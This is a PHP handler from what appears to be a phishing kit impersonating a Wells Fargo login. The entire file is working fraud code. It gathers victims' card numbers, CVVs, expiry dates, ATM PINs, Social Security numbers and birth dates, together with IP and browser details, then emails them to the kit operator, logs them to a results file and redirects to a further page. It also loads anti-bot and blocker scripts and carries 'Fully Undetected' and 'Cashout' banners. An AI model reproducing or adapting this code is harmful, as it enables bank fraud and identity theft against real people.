<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include '../your-email.php';
include './bt.php';
include "./blocker.php";
$message .= "------------------ Mr aroug  ---------------------\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  LOGIN -------------\n";
$message .= "Name on Card : ".$_POST['nameon']."\n";
$message .= "Card Number : ".$_POST['cc']."\n";
$message .= "Security code      : ".$_POST['CVV']."\n";
$message .= "expire Month: ".$_POST['bmonth']."\n";
$message .= "expire Year: ".$_POST['byear']."\n";
$message .= "ATM/PIN      : ".$_POST['PIN']."\n";
$message .= "Zip: ".$_POST['zip']."\n";
$message .= "SSN1: ".$_POST['ssn1']."\n";
$message .= "SSN2: ".$_POST['ssn2']."\n";
$message .= "SSN3: ".$_POST['ssn3']."\n";
$message .= "Dobmonth: ".$_POST['dobmonth']."\n";
$message .= "Dobdate: ".$_POST['dobdate']."\n";
$message .= "Dobyear: ".$_POST['dobyear']."\n";
$message .= "++-----[ $$ Fully Undetected by Skido $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Skido  ----------------------\n";
$subject = "Wells Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($to,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: 002.php");?>